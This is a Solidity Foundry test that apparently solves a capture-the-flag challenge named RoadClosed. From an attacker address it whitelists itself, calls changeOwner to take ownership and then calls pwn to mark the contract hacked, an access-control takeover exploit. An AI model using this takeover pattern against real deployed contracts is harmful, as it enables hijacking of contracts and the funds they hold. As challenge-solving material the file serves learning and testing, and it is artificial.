// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/RoadClosed.sol";

contract RoadBlockSolution is Test {

    //Become the owner of the contract
    //Change the value of hacked to true
    //0x01 deployer address
    //0x02 attacker address

    RoadClosed public target;

    function setUp() public {
        vm.prank(address(0x01));
        target = new RoadClosed();
        
    }

    function testInitialConditions() public {

        vm.startPrank(address(0x02));
        assertEq(target.isOwner(), false);
        assertEq(target.isHacked(), false);
    }

    function testSolution() public {

         vm.startPrank(address(0x02));
         target.addToWhitelist(address(0x02));
         target.changeOwner(address(0x02));
         target.pwn(address(0x02));

        assertEq(target.isOwner(), true); // owner == address(0x02)
        assertEq(target.isHacked(), true); //contract hacked == true
    }
}
